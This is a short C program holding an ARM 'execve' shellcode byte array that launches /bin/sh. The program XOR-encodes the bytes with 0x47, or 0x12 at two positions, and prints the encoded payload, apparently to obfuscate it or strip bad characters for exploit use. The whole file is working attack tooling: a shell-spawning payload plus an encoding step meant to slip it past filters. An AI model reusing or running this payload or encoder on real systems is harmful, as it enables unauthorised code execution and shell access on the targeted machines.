#include <stdio.h>
 
int main()
 
{
 
  //execve shellcode
 
  unsigned char shellcode[] = "\x0f\x00\xa0\xe1\x20\x00\x80\xe2\x02\x20\x42\xe0\x05\x00\x2d\xe9\x0d\x10\xa0\xe1\x0b\x70\xa0\xe3\x00\x00\x00\xef\x00\x00\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef\x2f\x62\x69\x6e\x2f\x73\x68\x00";
 
  int len = 48;
 
  char out[len];
 
  int i;
 
  for(i=0; i<len; i++){
 
    if(i==6 || i==12){
 
      out[i] = shellcode[i] ^ 0x12;
 
      printf("0x%x,", out[i]);
 
      out[i]++;
 
    }else{
 
      out[i] = shellcode[i] ^ 0x47;
 
      if(i==47){
 
        printf("0x%x\n", out[i]);
 
      }else{
 
        printf("0x%x,", out[i]);
 
      }
 
      out[i]++;
 
    }
 
  }
 
return 0;
 
}
